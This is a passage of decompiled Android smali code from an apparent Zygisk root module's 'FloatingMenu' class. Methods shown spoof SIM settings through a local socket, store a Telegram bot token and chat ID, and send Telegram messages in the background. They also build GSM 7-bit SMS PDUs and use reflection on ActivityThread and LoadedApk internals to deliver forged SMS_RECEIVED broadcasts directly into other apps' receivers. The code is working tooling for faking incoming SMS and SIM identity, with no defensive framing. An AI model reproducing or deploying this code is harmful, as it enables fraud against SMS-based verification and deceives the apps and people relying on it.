    if-eqz v4, :cond_a2

    :try_start_9f
    invoke-virtual {v4}, Landroid/net/LocalSocket;->close()V
    :try_end_a2
    .catchall {:try_start_9f .. :try_end_a2} :catchall_a2

    :catchall_a2
    :cond_a2
    throw v0
.end method

.method private static pack7bit(Ljava/lang/String;)[B
    .registers 10

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v0

    mul-int/lit8 v1, v0, 0x7

    add-int/lit8 v1, v1, 0x7

    div-int/lit8 v1, v1, 0x8

    new-array v1, v1, [B

    const/4 v2, 0x0

    const/4 v3, 0x0

    :goto_e
    if-ge v2, v0, :cond_35

    invoke-virtual {p0, v2}, Ljava/lang/String;->charAt(I)C

    move-result v4

    and-int/lit8 v4, v4, 0x7f

    div-int/lit8 v5, v3, 0x8

    rem-int/lit8 v6, v3, 0x8

    aget-byte v7, v1, v5

    shl-int v8, v4, v6

    or-int/2addr v7, v8

    int-to-byte v7, v7

    aput-byte v7, v1, v5

    const/4 v7, 0x1

    if-le v6, v7, :cond_30

    add-int/lit8 v5, v5, 0x1

    aget-byte v7, v1, v5

    rsub-int/lit8 v6, v6, 0x8

    ushr-int/2addr v4, v6

    or-int/2addr v4, v7

    int-to-byte v4, v4

    aput-byte v4, v1, v5

    :cond_30
    add-int/lit8 v3, v3, 0x7

    add-int/lit8 v2, v2, 0x1

    goto :goto_e

    :cond_35
    return-object v1
.end method

.method private static packSeptets([B)[B
    .registers 10

    array-length v0, p0

    mul-int/lit8 v1, v0, 0x7

    add-int/lit8 v1, v1, 0x7

    div-int/lit8 v1, v1, 0x8

    new-array v1, v1, [B

    const/4 v2, 0x0

    const/4 v3, 0x0

    :goto_b
    if-ge v2, v0, :cond_30

    aget-byte v4, p0, v2

    and-int/lit8 v4, v4, 0x7f

    div-int/lit8 v5, v3, 0x8

    rem-int/lit8 v6, v3, 0x8

    aget-byte v7, v1, v5

    shl-int v8, v4, v6

    or-int/2addr v7, v8

    int-to-byte v7, v7

    aput-byte v7, v1, v5

    const/4 v7, 0x1

    if-le v6, v7, :cond_2b

    add-int/lit8 v5, v5, 0x1

    aget-byte v7, v1, v5

    rsub-int/lit8 v6, v6, 0x8

    ushr-int/2addr v4, v6

    or-int/2addr v4, v7

    int-to-byte v4, v4

    aput-byte v4, v1, v5

    :cond_2b
    add-int/lit8 v3, v3, 0x7

    add-int/lit8 v2, v2, 0x1

    goto :goto_b

    :cond_30
    return-object v1
.end method

.method public static saveSimSettingsEx(ZLjava/lang/String;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;)Z
    .registers 15

    const-string v6, "in"

    const/4 v7, 0x0

    const/4 v8, 0x0

    move v0, p0

    move-object v1, p1

    move-object v2, p2

    move v3, p3

    move-object v4, p4

    move-object v5, p5

    invoke-static/range {v0 .. v8}, Lcom/floatingmenu/FloatingMenu;->saveSimSettingsEx(ZLjava/lang/String;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;ZZ)Z

    move-result p0

    return p0
.end method

.method public static saveSimSettingsEx(ZLjava/lang/String;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z
    .registers 16

    const/4 v7, 0x0

    const/4 v8, 0x0

    move v0, p0

    move-object v1, p1

    move-object v2, p2

    move v3, p3

    move-object v4, p4

    move-object v5, p5

    move-object v6, p6

    invoke-static/range {v0 .. v8}, Lcom/floatingmenu/FloatingMenu;->saveSimSettingsEx(ZLjava/lang/String;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;ZZ)Z

    move-result p0

    return p0
.end method

.method public static saveSimSettingsEx(ZLjava/lang/String;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)Z
    .registers 17

    const/4 v8, 0x0

    move v0, p0

    move-object v1, p1

    move-object v2, p2

    move v3, p3

    move-object v4, p4

    move-object v5, p5

    move-object v6, p6

    move/from16 v7, p7

    invoke-static/range {v0 .. v8}, Lcom/floatingmenu/FloatingMenu;->saveSimSettingsEx(ZLjava/lang/String;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;ZZ)Z

    move-result v0

    return v0
.end method

.method public static saveSimSettingsEx(ZLjava/lang/String;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;ZZ)Z
    .registers 15

    const-string v0, "UTF-8"

    const-string v1, "|"

    const-string v2, "SET_SIM_SETTINGS|"

    invoke-static/range {p0 .. p8}, Lcom/floatingmenu/MenuLoader;->updateMockSimSettingsEx2(ZLjava/lang/String;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;ZZ)V

    const/4 v3, 0x0

    :try_start_a
    new-instance v4, Landroid/net/LocalSocket;

    invoke-direct {v4}, Landroid/net/LocalSocket;-><init>()V
    :try_end_f
    .catchall {:try_start_a .. :try_end_f} :catchall_8c

    :try_start_f
    new-instance v3, Landroid/net/LocalSocketAddress;

    const-string v5, "zygisk_menu_socket"

    invoke-direct {v3, v5}, Landroid/net/LocalSocketAddress;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v3}, Landroid/net/LocalSocket;->connect(Landroid/net/LocalSocketAddress;)V

    const/16 v3, 0xbb8

    invoke-virtual {v4, v3}, Landroid/net/LocalSocket;->setSoTimeout(I)V

    invoke-virtual {v4}, Landroid/net/LocalSocket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, p0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p7}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p8}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string p0, "\n"

    invoke-virtual {v5, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p0

    invoke-virtual {v3, p0}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V

    new-instance p0, Ljava/io/BufferedReader;

    new-instance p1, Ljava/io/InputStreamReader;

    invoke-virtual {v4}, Landroid/net/LocalSocket;->getInputStream()Ljava/io/InputStream;

    move-result-object p2

    invoke-direct {p1, p2, v0}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    invoke-direct {p0, p1}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    invoke-virtual {p0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object p0

    const-string p1, "OK"

    invoke-virtual {p1, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0
    :try_end_85
    .catchall {:try_start_f .. :try_end_85} :catchall_89

    :try_start_85
    invoke-virtual {v4}, Landroid/net/LocalSocket;->close()V
    :try_end_88
    .catchall {:try_start_85 .. :try_end_88} :catchall_88

    :catchall_88
    return p0

    :catchall_89
    move-exception p0

    move-object v3, v4

    goto :goto_8d

    :catchall_8c
    move-exception p0

    :goto_8d
    :try_start_8d
    const-string p1, "zygisk_floating_menu"

    const-string p2, "Error saving SIM settings via socket"

    invoke-static {p1, p2, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_94
    .catchall {:try_start_8d .. :try_end_94} :catchall_9b

    if-eqz v3, :cond_99

    :try_start_96
    invoke-virtual {v3}, Landroid/net/LocalSocket;->close()V
    :try_end_99
    .catchall {:try_start_96 .. :try_end_99} :catchall_99

    :catchall_99
    :cond_99
    const/4 p0, 0x0

    return p0

    :catchall_9b
    move-exception p0

    if-eqz v3, :cond_a1

    :try_start_9e
    invoke-virtual {v3}, Landroid/net/LocalSocket;->close()V
    :try_end_a1
    .catchall {:try_start_9e .. :try_end_a1} :catchall_a1

    :catchall_a1
    :cond_a1
    throw p0
.end method

.method public static saveTelegramConfig(Ljava/lang/String;Ljava/lang/String;)Z
    .registers 7

    const-string v0, "UTF-8"

    const-string v1, "SET_CONFIG|"

    invoke-static {}, Lcom/floatingmenu/FloatingMenu;->getSystemContext()Landroid/content/Context;

    move-result-object v2

    if-eqz v2, :cond_24

    const-string v3, "zygisk_menu_prefs"

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v3, "tg_token"

    invoke-interface {v2, v3, p0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v3, "tg_chat_id"

    invoke-interface {v2, v3, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    :cond_24
    const/4 v2, 0x0

    :try_start_25
    new-instance v3, Landroid/net/LocalSocket;

    invoke-direct {v3}, Landroid/net/LocalSocket;-><init>()V
    :try_end_2a
    .catchall {:try_start_25 .. :try_end_2a} :catchall_7f

    :try_start_2a
    new-instance v2, Landroid/net/LocalSocketAddress;

    const-string v4, "zygisk_menu_socket"

    invoke-direct {v2, v4}, Landroid/net/LocalSocketAddress;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v2}, Landroid/net/LocalSocket;->connect(Landroid/net/LocalSocketAddress;)V

    const/16 v2, 0xbb8

    invoke-virtual {v3, v2}, Landroid/net/LocalSocket;->setSoTimeout(I)V

    invoke-virtual {v3}, Landroid/net/LocalSocket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, "|"

    invoke-virtual {v4, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, "\n"

    invoke-virtual {v4, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p0

    invoke-virtual {v2, p0}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v2}, Ljava/io/OutputStream;->flush()V

    new-instance p0, Ljava/io/BufferedReader;

    new-instance p1, Ljava/io/InputStreamReader;

    invoke-virtual {v3}, Landroid/net/LocalSocket;->getInputStream()Ljava/io/InputStream;

    move-result-object v1

    invoke-direct {p1, v1, v0}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    invoke-direct {p0, p1}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    invoke-virtual {p0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object p0

    const-string p1, "OK"

    invoke-virtual {p1, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0
    :try_end_78
    .catchall {:try_start_2a .. :try_end_78} :catchall_7c

    :try_start_78
    invoke-virtual {v3}, Landroid/net/LocalSocket;->close()V
    :try_end_7b
    .catchall {:try_start_78 .. :try_end_7b} :catchall_7b

    :catchall_7b
    return p0

    :catchall_7c
    move-exception p0

    move-object v2, v3

    goto :goto_80

    :catchall_7f
    move-exception p0

    :goto_80
    :try_start_80
    const-string p1, "zygisk_floating_menu"

    const-string v0, "Error saving Telegram config to socket server"

    invoke-static {p1, v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_87
    .catchall {:try_start_80 .. :try_end_87} :catchall_8e

    if-eqz v2, :cond_8c

    :try_start_89
    invoke-virtual {v2}, Landroid/net/LocalSocket;->close()V
    :try_end_8c
    .catchall {:try_start_89 .. :try_end_8c} :catchall_8c

    :catchall_8c
    :cond_8c
    const/4 p0, 0x1

    return p0

    :catchall_8e
    move-exception p0

    if-eqz v2, :cond_94

    :try_start_91
    invoke-virtual {v2}, Landroid/net/LocalSocket;->close()V
    :try_end_94
    .catchall {:try_start_91 .. :try_end_94} :catchall_94

    :catchall_94
    :cond_94
    throw p0
.end method

.method public static sendTelegramMessageAsync(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .registers 5

    if-eqz p0, :cond_26

    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_26

    if-eqz p1, :cond_26

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_26

    if-eqz p2, :cond_26

    invoke-virtual {p2}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_19

    goto :goto_26

    :cond_19
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/floatingmenu/FloatingMenu$5;

    invoke-direct {v1, p0, p2, p1}, Lcom/floatingmenu/FloatingMenu$5;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_26
    :goto_26
    return-void
.end method

.method public static show(Landroid/app/Activity;)V
    .registers 2

    if-nez p0, :cond_3

    return-void

    :cond_3
    new-instance v0, Lcom/floatingmenu/FloatingMenu$1;

    invoke-direct {v0, p0}, Lcom/floatingmenu/FloatingMenu$1;-><init>(Landroid/app/Activity;)V

    invoke-virtual {p0, v0}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method private static showToast(Landroid/content/Context;Ljava/lang/String;)V
    .registers 3

    const/4 v0, 0x0

    invoke-static {p0, p1, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p0

    invoke-virtual {p0}, Landroid/widget/Toast;->show()V

    return-void
.end method

.method private static stringToGsm7BitSeptets(Ljava/lang/String;)[B
    .registers 16

    new-instance v0, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    const/4 v1, 0x0

    const/4 v2, 0x0

    :goto_7
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v3

    if-ge v2, v3, :cond_16b

    invoke-virtual {p0, v2}, Ljava/lang/String;->charAt(I)C

    move-result v3

    const/16 v4, 0x5b

    const/16 v5, 0x1b

    if-ne v3, v4, :cond_21

    invoke-virtual {v0, v5}, Ljava/io/ByteArrayOutputStream;->write(I)V

    const/16 v3, 0x3c

    :goto_1c
    invoke-virtual {v0, v3}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto/16 :goto_167

    :cond_21
    const/16 v6, 0x5d

    if-ne v3, v6, :cond_2b

    invoke-virtual {v0, v5}, Ljava/io/ByteArrayOutputStream;->write(I)V

    const/16 v3, 0x3e

    goto :goto_1c

    :cond_2b
    const/16 v7, 0x7b

    if-ne v3, v7, :cond_35

    invoke-virtual {v0, v5}, Ljava/io/ByteArrayOutputStream;->write(I)V

    const/16 v3, 0x28

    goto :goto_1c

    :cond_35
    const/16 v8, 0x7d

    if-ne v3, v8, :cond_3f

    invoke-virtual {v0, v5}, Ljava/io/ByteArrayOutputStream;->write(I)V

    const/16 v3, 0x29

    goto :goto_1c

    :cond_3f
    const/16 v9, 0x5c

    if-ne v3, v9, :cond_49

    invoke-virtual {v0, v5}, Ljava/io/ByteArrayOutputStream;->write(I)V

    const/16 v3, 0x2f

    goto :goto_1c

    :cond_49
    const/16 v10, 0x7e

    if-ne v3, v10, :cond_53

    invoke-virtual {v0, v5}, Ljava/io/ByteArrayOutputStream;->write(I)V

    const/16 v3, 0x3d

    goto :goto_1c

    :cond_53
    const/16 v11, 0x40

    const/16 v12, 0x7c

    if-ne v3, v12, :cond_61

    invoke-virtual {v0, v5}, Ljava/io/ByteArrayOutputStream;->write(I)V

    invoke-virtual {v0, v11}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto/16 :goto_167

    :cond_61
    const/16 v13, 0x5e

    if-ne v3, v13, :cond_6b

    invoke-virtual {v0, v5}, Ljava/io/ByteArrayOutputStream;->write(I)V

    const/16 v3, 0x14

    goto :goto_1c

    :cond_6b
    const/16 v14, 0x20ac

    if-ne v3, v14, :cond_75

    invoke-virtual {v0, v5}, Ljava/io/ByteArrayOutputStream;->write(I)V

    const/16 v3, 0x65

    goto :goto_1c

    :cond_75
    if-ne v3, v11, :cond_7c

    invoke-virtual {v0, v1}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto/16 :goto_167

    :cond_7c
    const/16 v5, 0xa3

    if-ne v3, v5, :cond_82

    const/4 v3, 0x1

    goto :goto_1c

    :cond_82
    const/16 v5, 0x24

    if-ne v3, v5, :cond_88

    const/4 v3, 0x2

    goto :goto_1c

    :cond_88
    const/16 v5, 0xa5

    if-ne v3, v5, :cond_8e

    const/4 v3, 0x3

    goto :goto_1c

    :cond_8e
    const/16 v5, 0xe8

    if-ne v3, v5, :cond_94

    const/4 v3, 0x4

    goto :goto_1c

    :cond_94
    const/16 v5, 0xe9

    if-ne v3, v5, :cond_9a

    const/4 v3, 0x5

    goto :goto_1c

    :cond_9a
    const/16 v5, 0xf9

    if-ne v3, v5, :cond_a1

    const/4 v3, 0x6

    goto/16 :goto_1c

    :cond_a1
    const/16 v5, 0xec

    if-ne v3, v5, :cond_a8

    const/4 v3, 0x7

    goto/16 :goto_1c

    :cond_a8
    const/16 v5, 0xf2

    if-ne v3, v5, :cond_b0

    const/16 v3, 0x8

    goto/16 :goto_1c

    :cond_b0
    const/16 v5, 0xc7

    if-ne v3, v5, :cond_b8

    const/16 v3, 0x9

    goto/16 :goto_1c

    :cond_b8
    const/16 v5, 0xa

    if-ne v3, v5, :cond_c1

    :goto_bc
    invoke-virtual {v0, v5}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto/16 :goto_167

    :cond_c1
    const/16 v5, 0xd8

    if-ne v3, v5, :cond_c9

    const/16 v3, 0xb

    goto/16 :goto_1c

    :cond_c9
    const/16 v5, 0xf8

    if-ne v3, v5, :cond_d1

    const/16 v3, 0xc

    goto/16 :goto_1c

    :cond_d1
    const/16 v5, 0xd

    if-ne v3, v5, :cond_d6

    goto :goto_bc

    :cond_d6
    const/16 v5, 0xc5

    if-ne v3, v5, :cond_de

    const/16 v3, 0xe

    goto/16 :goto_1c

    :cond_de
    const/16 v5, 0xe5

    if-ne v3, v5, :cond_e6

    const/16 v3, 0xf

    goto/16 :goto_1c

    :cond_e6
    const/16 v5, 0x5f

    if-ne v3, v5, :cond_ee

    const/16 v3, 0x11

    goto/16 :goto_1c

    :cond_ee
    const/16 v11, 0xc6

    if-ne v3, v11, :cond_f6

    const/16 v3, 0x1c

    goto/16 :goto_1c

    :cond_f6
    const/16 v11, 0xe6

    if-ne v3, v11, :cond_fe

    const/16 v3, 0x1d

    goto/16 :goto_1c

    :cond_fe
    const/16 v11, 0xdf

    if-ne v3, v11, :cond_106

    const/16 v3, 0x1e

    goto/16 :goto_1c

    :cond_106
    const/16 v11, 0xc9

    if-ne v3, v11, :cond_10e

    const/16 v3, 0x1f

    goto/16 :goto_1c

    :cond_10e
    const/16 v11, 0xc4

    if-ne v3, v11, :cond_116

    invoke-virtual {v0, v4}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto :goto_167

    :cond_116
    const/16 v4, 0xd6

    if-ne v3, v4, :cond_11e

    invoke-virtual {v0, v9}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto :goto_167

    :cond_11e
    const/16 v4, 0xd1

    if-ne v3, v4, :cond_126

    invoke-virtual {v0, v6}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto :goto_167

    :cond_126
    const/16 v4, 0xdc

    if-ne v3, v4, :cond_12e

    invoke-virtual {v0, v13}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto :goto_167

    :cond_12e
    const/16 v4, 0xa7

    if-ne v3, v4, :cond_133

    goto :goto_bc

    :cond_133
    const/16 v4, 0xe4

    if-ne v3, v4, :cond_13b

    invoke-virtual {v0, v7}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto :goto_167

    :cond_13b
    const/16 v4, 0xf6

    if-ne v3, v4, :cond_143

    invoke-virtual {v0, v12}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto :goto_167

    :cond_143
    const/16 v4, 0xf1

    if-ne v3, v4, :cond_14b

    invoke-virtual {v0, v8}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto :goto_167

    :cond_14b
    const/16 v4, 0xfc

    if-ne v3, v4, :cond_153

    invoke-virtual {v0, v10}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto :goto_167

    :cond_153
    const/16 v4, 0xe0

    if-ne v3, v4, :cond_15b

    const/16 v3, 0x7f

    goto/16 :goto_1c

    :cond_15b
    const/16 v4, 0x20

    if-lt v3, v4, :cond_163

    if-gt v3, v10, :cond_163

    goto/16 :goto_1c

    :cond_163
    const/16 v3, 0x3f

    goto/16 :goto_1c

    :goto_167
    add-int/lit8 v2, v2, 0x1

    goto/16 :goto_7

    :cond_16b
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p0

    return-object p0
.end method

.method private static triggerLocalSmsBroadcast(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .registers 10

    :try_start_0
    invoke-static {p1, p2}, Lcom/floatingmenu/FloatingMenu;->injectSmsSystemWideAsync(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {p1, p2}, Lcom/floatingmenu/FloatingMenu;->createSmsPdu(Ljava/lang/String;Ljava/lang/String;)[B

    move-result-object p1

    if-eqz p1, :cond_f3

    array-length p2, p1

    if-nez p2, :cond_e

    goto/16 :goto_f3

    :cond_e
    new-instance p2, Landroid/content/Intent;

    const-string v0, "android.provider.Telephony.SMS_RECEIVED"

    invoke-direct {p2, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v0, "pdus"

    const/4 v1, 0x1

    new-array v2, v1, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object p1, v2, v3

    invoke-virtual {p2, v0, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    const-string p1, "format"

    const-string v0, "3gpp"

    invoke-virtual {p2, p1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string p1, "android.app.ActivityThread"

    invoke-static {p1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p1

    const-string v0, "currentActivityThread"

    new-array v2, v3, [Ljava/lang/Class;

    invoke-virtual {p1, v0, v2}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/reflect/AccessibleObject;->setAccessible(Z)V

    new-array v2, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    invoke-virtual {v0, v4, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    if-nez v0, :cond_4a

    const-string p1, "ActivityThread not found"

    invoke-static {p0, p1}, Lcom/floatingmenu/FloatingMenu;->showToast(Landroid/content/Context;Ljava/lang/String;)V

    return-void

    :catchall_47
    move-exception p1

    goto/16 :goto_f9

    :cond_4a
    const-string v2, "mPackages"

    invoke-virtual {p1, v2}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object p1

    invoke-virtual {p1, v1}, Ljava/lang/reflect/AccessibleObject;->setAccessible(Z)V

    invoke-virtual {p1, v0}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Ljava/util/Map;

    if-eqz p1, :cond_f0

    invoke-interface {p1}, Ljava/util/Map;->values()Ljava/util/Collection;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/Collection;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_63
    :goto_63
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_e8

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/ref/WeakReference;

    invoke-virtual {v0}, Ljava/lang/ref/Reference;->get()Ljava/lang/Object;

    move-result-object v0

    if-nez v0, :cond_76

    goto :goto_63

    :cond_76
    const-string v2, "android.app.LoadedApk"

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    const-string v4, "mReceivers"

    invoke-virtual {v2, v4}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/reflect/AccessibleObject;->setAccessible(Z)V

    invoke-virtual {v2, v0}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/Map;

    if-eqz v0, :cond_63

    invoke-interface {v0}, Ljava/util/Map;->entrySet()Ljava/util/Set;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_95
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_63

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/util/Map$Entry;

    invoke-interface {v2}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/content/Context;

    invoke-interface {v2}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/util/Map;

    if-eqz v2, :cond_95

    invoke-interface {v2}, Ljava/util/Map;->keySet()Ljava/util/Set;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_b7
    :goto_b7
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_95

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/content/BroadcastReceiver;

    if-eqz v5, :cond_b7

    instance-of v3, p0, Landroid/app/Activity;

    if-eqz v3, :cond_d5

    move-object v3, p0

    check-cast v3, Landroid/app/Activity;

    new-instance v6, Lcom/floatingmenu/FloatingMenu$2;

    invoke-direct {v6, v5, v4, p2}, Lcom/floatingmenu/FloatingMenu$2;-><init>(Landroid/content/BroadcastReceiver;Landroid/content/Context;Landroid/content/Intent;)V

    invoke-virtual {v3, v6}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto :goto_e6

    :cond_d5
    new-instance v3, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v6

